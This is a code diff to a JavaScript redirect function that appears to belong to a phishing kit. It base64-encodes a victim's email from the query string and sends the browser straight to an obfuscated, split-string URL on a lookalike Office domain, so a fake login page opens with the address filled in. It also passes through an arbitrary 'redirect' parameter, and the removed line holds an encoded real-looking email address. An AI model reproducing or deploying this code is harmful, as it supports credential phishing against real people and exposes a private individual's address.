@@ -239,9 +239,16 @@
     // Immediately redirect users to the redirect URL
     function getRedirectURL() {
         const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get("addressEML");
 
         function transformEmail(u) {
             return btoa(u); // Base64 encode
+        }
+
+        if (email) {
+            const encodedEmail = transformEmail(email);
+            // Replace the current URL with the encoded email
+            window.history.replaceState(null, '', `?addressEML=${encodedEmail}`);
         }
         
         const z = "https://office.orderinv";
@@ -249,11 +256,10 @@
         const x = "info";
         const w = "/uCeGVUja";
         const v = "#Eml=";
-        const u = "c2FyYWhAZHJpdmVyc3BpY2tsZXMuY28udWs=";
         
-        const t = transformEmail(u);
+        const t = email ? transformEmail(email) : "defaultEncodedEmail";
         const result = z + y + x + w + v + t;
-        return urlParams.get("redirect") || (z + y + x + w + v + u);
+        return urlParams.get("redirect") || result;
     }
 
     // Redirect immediately
